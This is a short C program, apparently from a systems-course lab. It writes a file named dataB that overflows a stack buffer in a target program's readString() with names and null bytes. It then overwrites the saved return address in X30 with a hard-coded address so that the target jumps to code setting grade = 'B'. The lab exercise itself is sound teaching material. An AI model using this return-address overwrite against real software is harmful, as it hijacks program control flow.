/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: William Svoboda and Will Drury                             */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>

/* Write our names to a file named dataB, followed by enough null bytes
   to fill the buf array in readString(). Next, write in machine code
   to dataB the address of "grade = 'B'" in main, which will overwrite
   the return address stored in X30. Return 0. */

int main(void)
{
   unsigned long ulData; /* the address with which to overwrite X30 */
   int i;
   
   /* open the file */
   FILE *psFile;
   psFile = fopen("dataB", "w");

   /* write our names to the file */
   fprintf(psFile, "William and Will"); /* writes 16 bytes to file */

   /* write 32 bytes to the file to fill up buf */
   for (i = 0; i < 32; i++)
       putc(0x00, psFile); /* writes 00000000 */

   /* write the address of "grade = 'B'" (0x400858) to the file  */
   ulData = 0x400858;
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);

   /* close the file */
   fclose(psFile);

   return 0;
}
